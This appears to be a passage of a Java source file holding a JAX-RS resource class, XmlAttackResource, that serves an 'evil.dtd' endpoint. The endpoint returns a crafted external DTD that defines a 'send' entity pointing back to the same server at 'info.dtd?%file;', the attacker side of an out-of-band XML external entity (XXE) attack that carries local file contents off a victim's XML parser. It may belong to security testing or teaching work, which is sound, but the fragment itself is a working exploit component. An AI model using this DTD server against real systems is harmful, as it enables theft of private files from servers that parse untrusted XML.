...
public class XmlAttackResource {
    
    @Path("evil.dtd")
    @GET
    public Response evil(@Context HttpServletRequest request) {
    	String url = request.getRequestURL().toString();
    	url = url.replace("evil.dtd", "info.dtd?%file;");
    	StringBuilder sb = new StringBuilder();
    	sb.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
    	.append("<!ENTITY % all \"<!ENTITY &#x25; send SYSTEM '" + url + "'>\">").append("\n")
    	.append("%all;");
    	return Response.ok(sb.toString()).header("Content-Type", MediaType.TEXT_XML).build();
    }
